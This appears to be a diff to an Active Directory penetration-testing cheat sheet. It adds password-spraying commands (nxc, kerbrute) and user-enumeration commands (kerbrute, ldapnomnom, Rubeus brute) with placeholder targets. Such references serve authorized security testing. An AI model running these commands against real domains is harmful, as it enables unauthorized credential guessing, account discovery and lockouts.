@@ -92,12 +92,29 @@ Find-DomainShare
 
 ## Password Spraying
 
+> <https://github.com/ropnop/kerbrute>
+
 ```shell
 # nxc or cme
 nxc smb <ip> -u users.txt -p <password> -d <domain> --continue-on-success
 
 # kerbrute
 kerbrute passwordspray -d <domain> users.txt <password> --dc <dc_ip>
+```
+
+## User Enumeration
+
+> <https://github.com/lkarlslund/ldapnomnom>
+
+```shell
+# enum users via Kerberos
+kerbrute enumusers --dc <ip> -d <domain> <userlist>
+
+# LDAPnomnom
+ldapnomnom -dnsdomain <domain> -server <dc-ip> -input <wordlist>
+
+# windows
+.\Rubeus.exe brute /users:<userlist> /passwords:<wordlist> /domain:<domain>
 ```
 
 ## Credential Testing
@@ -209,4 +226,3 @@ ldapdomaindump -u '<domain>\<user>' -p '<pass>' <ip>
 Import-Module .\adPEAS.ps1
 Invoke-adPEAS
 ```
-
